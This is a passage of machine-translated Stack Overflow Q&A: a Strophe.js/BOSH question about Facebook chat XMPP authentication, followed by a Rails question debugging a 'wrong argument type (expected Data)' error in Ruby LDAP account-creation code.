  requests='2' inactivity='120' maxpause='120' polling='2' ver='1.8' from='chat.facebook.com' secure='true'
  authid='3105619037' xmpp:version='1.0'>
<stream:features xmlns:stream='http://etherx.jabber.org/streams'>
    <mechanisms xmlns='urn:ietf:params:xml:ns:xmpp-sasl'>
        <mechanism>SCRAM-SHA-1</mechanism>
        <mechanism>DIGEST-MD5</mechanism>
        <mechanism>PLAIN</mechanism>
    </mechanisms>
    <c xmlns='http://jabber.org/protocol/caps' hash='sha-1' node='http://www.process-one.net/en/ejabberd/'
       ver='TQ2JFyRoSa70h2G1bpgjzuXb2sU='/>
    <register xmlns='http://jabber.org/features/iq-register'/>
</stream:features> 
```

这是错误的，我期望将 X-FACEBOOK-PLATFORM 作为机制之一。任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-29T07:32:12.610

经过一周多的努力，我让它开始工作，我切换到[旁遮普语](https://github.com/twonds/punjab)而不是节点服务器，一切正常。所以基本上结构是：

Strophe.js <-> Apache（代理）<-> 旁遮普语 <-> Facebook XMPP 服务器

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T09:08:13.647

请参阅[BOSH 模块未启动：Ejabberd / Strophe 设置问题](https://stackoverflow.com/questions/15101140/bosh-module-not-started-ejabberd-strophe-setup-issue/15107826)。

您可能没有在 Strophe 页面的用户名字段中使用 name@host。
旁遮普省正在为您添加它，这使它起作用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T18:31:45.907

上次我遇到这个问题（我现在又遇到了；-)）问题是我需要将我试图访问 BOSH 服务器的 HTTP 主机添加到“主机”配置选项中。

祝你好运！

# ruby-on-rails - 错误的参数类型# （预期数据）

> ID：11651995
> 
> 赞同：-2
> 
> 时间：2012-07-25T14:25:42.573
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, illegalargumentexception

我正在尝试修复代码中的错误。有些部分我已经修好了。现在我得到这个错误......

```
 TypeError in Ldap#getAccount

Showing /home/stadler/tool/app/views/layouts/_stylesheets.html.erb where line #5 raised:

wrong argument type #<Class:0xb996604> (expected Data)

Extracted source (around line #5):

2: <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
3: <![endif]-->
4: <%= stylesheet_link_tag 'blueprint/screen', :media => 'screen' %>
5: <!--<%= stylesheet_link_tag 'blueprint/print',  :media => 'print' %>-->
6: <!--[if lt IE 8]><%= stylesheet_link_tag 'blueprint/ie' %><![endif]-->
7: <%= stylesheet_link_tag 'custom', :media => 'screen' %>

Trace of template inclusion: app/views/layouts/application.html.erb

Rails.root: /home/stadler/tool
Application Trace | Framework Trace | Full Trace

app/views/layouts/_stylesheets.html.erb:5:in `_app_views_layouts__stylesheets_html_erb__369773416_97305840'
app/views/layouts/application.html.erb:5:in `_app_views_layouts_application_html_erb___101889169_97634680'

Request

Parameters:

{"utf8"=>"✓",
 "authenticity_token"=>"kaADQKjwVLpyTx36sZjq+ZYgdrrlWIWLFdlbCDHgDIQ=",
 "id"=>"666667",
 "commit"=>"Gibs mir ja!"} 
```

当我在我的一个控制器中实现此方法时，这些错误就开始了。

```
 def getGridNumber(group)
     base = "ou=Groups, dc=-, dc=-, dc=-"
     filter = 'cn='+group
     puts filter
     attrs = ['gidNumber']
     puts group
     conn = LDAP::Conn.new($HOST, $PORT)
     conn.bind('cn=admin, dc=-, dc=-, dc=-','-')

     conn.perror("bind")

     begin
       conn.search(base, $scope, filter, attrs) { |entry|
       @gridNumber=entry.vals('gidNumber').first
       puts entry.vals('gidNumber')
       }
     rescue LDAP::ResultError
       conn.perror("search")
       exit
     end
     conn.perror("search")
     conn.unbind
     end 
```

我在这部分使用这种方法：

```
 def addAccount
   conn = LDAP::Conn.new($HOST, $PORT)
   conn.bind('cn=admin, dc=-, dc=-, dc=de','-')

   conn.perror("bind")
   pw=params[:userpassword]
   genPasswd(pw)
   getGridNumber(params[:group])
   for i in 2000 ... 7000 do
   filter = 'uidNumber='+i.to_s
   array=conn.search2($base, $scope, filter, ['*'])
     if array.size == 0 then 
       @uidnumber=i
       break
     end
   end   

   entry = [
   LDAP.mod(LDAP::LDAP_MOD_ADD,'objectClass',["account","posixAccount","top","shadowAccount","sambaSamAccount","eClara"]),
   LDAP.mod(LDAP::LDAP_MOD_ADD,'uid',params[:uid].split()),
   LDAP.mod(LDAP::LDAP_MOD_ADD,'uidNumber',[@uidnumber.to_s]),
   LDAP.mod(LDAP::LDAP_MOD_ADD,'gidNumber',[@gridNumber]),
   LDAP.mod(LDAP::LDAP_MOD_ADD,'homeDirectory',['/home/stadler/tool/test/'+params[:uid]]),
   LDAP.mod(LDAP::LDAP_MOD_ADD,'gecos',params[:gecos].split()),
   LDAP.mod(LDAP::LDAP_MOD_ADD,'shadowLastChange',params[:shadowlastchange].split()),
   LDAP.mod(LDAP::LDAP_MOD_ADD,'sambaLogoffTime',params[:sambalogofftime].split()),
   LDAP.mod(LDAP::LDAP_MOD_ADD,'displayName',params[:displayname].split()),
   LDAP.mod(LDAP::LDAP_MOD_ADD,'cn',params[:uid].split()),
   #LDAP.mod(LDAP::LDAP_MOD_ADD,'loginShell',params[:loginshell].split()),
   LDAP.mod(LDAP::LDAP_MOD_ADD,'loginShell',['/bin/bash']),
   LDAP.mod(LDAP::LDAP_MOD_ADD,'sambaLMPassword',params[:sambalmpassword].split()),
   LDAP.mod(LDAP::LDAP_MOD_ADD,'sambaNTPassword',params[:sambantpassword].split()),
   LDAP.mod(LDAP::LDAP_MOD_ADD,'sambaLogonTime',params[:sambalogontime].split()),
   LDAP.mod(LDAP::LDAP_MOD_ADD,'userPassword',[@slappedpwd]),
   LDAP.mod(LDAP::LDAP_MOD_ADD,'lernStatus1',params[:lernstatus1].split()),
   LDAP.mod(LDAP::LDAP_MOD_ADD,'sambaPwdMustChange',params[:sambapwdmustchange].split()),
   LDAP.mod(LDAP::LDAP_MOD_ADD,'sambaKickoffTime',params[:sambakickofftime].split()),
   LDAP.mod(LDAP::LDAP_MOD_ADD,'sambaPwdCanChange',params[:sambapwdcanchange].split()),
   LDAP.mod(LDAP::LDAP_MOD_ADD,'sambaSID',params[:sambasid].split()),
]

    begin
      address= 'uid='+params[:uid]+', ou=Users, dc=cippool-mb, dc=rwth-aachen, dc=de'
      conn.add(address, entry)
      FileUtils.mkdir '/home/stadler/tool/test/'+params[:uid], :mode => 0700
      FileUtils.chown 'stadler', 'stadler', '/home/stadler/tool/test/'+params[:uid] 
      FileUtils.remove_dir('tmp') 
      flash[:success] = "Account added!"

    rescue LDAP::ResultError
      conn.perror("add")
      flash[:error] = "WTF!!!!! Already there! " 
      #exit
    end
      conn.perror("add")
      conn.unbind
    redirect_to :action => "getAllAccounts"
  end 
```

我试图获取更多信息，但首先，有人能告诉我错误的参数类型`#<Class:0xb996604>`（预期数据）是什么意思吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-27T12:55:12.953

我对我的基本框架进行了重新编码，现在错误消失了。我刚刚收到一个错误，有一次我切换了一个页面。我使用的方法都是一样的，我只切换到了bootstrap、less和Rails 3.2.6。也许这是一个样式表问题，但我不知道，因为错误只发生过一次，而且是突然的。

```
 Started GET "/assets/bootstrap-modal.js?body=1" for 127.0.0.1 at 2012-07-27 15:00:11 +0200
Served asset /bootstrap-modal.js - 304 Not Modified (1ms)
[2012-07-27 15:00:12] ERROR TypeError: wrong argument type #<Class:0xbd41740> (expected Data)
    /usr/local/lib/ruby/gems/1.9.1/gems/railties-3.2.6/lib/rails/rack/log_tailer.rb:29:in `write'
    /usr/local/lib/ruby/gems/1.9.1/gems/railties-3.2.6/lib/rails/rack/log_tailer.rb:29:in `print'
    /usr/local/lib/ruby/gems/1.9.1/gems/railties-3.2.6/lib/rails/rack/log_tailer.rb:29:in `tail!'
    /usr/local/lib/ruby/gems/1.9.1/gems/railties-3.2.6/lib/rails/rack/log_tailer.rb:18:in `call'
    /usr/local/lib/ruby/gems/1.9.1/gems/rack-1.4.1/lib/rack/handler/webrick.rb:59:in `service'
    /usr/local/lib/ruby/1.9.1/webrick/httpserver.rb:111:in `service'
    /usr/local/lib/ruby/1.9.1/webrick/httpserver.rb:70:in `run'
    /usr/local/lib/ruby/1.9.1/webrick/server.rb:183:in `block in start_thread' 
```

-

```
module Rails
  module Rack
    class LogTailer
          def initialize(app, log = nil)
            @app = app

            path = Pathname.new(log || "#{::File.expand_path(Rails.root)}/log/#{Rails.env}.log").cleanpath

            @cursor = @file = nil
            if ::File.exists?(path)
              @cursor = ::File.size(path)
              @file = ::File.open(path, 'r')
            end
          end

          def call(env)
            response = @app.call(env)
            tail!
            response
          end

          def tail!
            return unless @cursor
            @file.seek @cursor

            unless @file.eof?
              contents = @file.read
              @cursor = @file.tell
              $stdout.print contents
            end
          end
        end
      end
    end 
```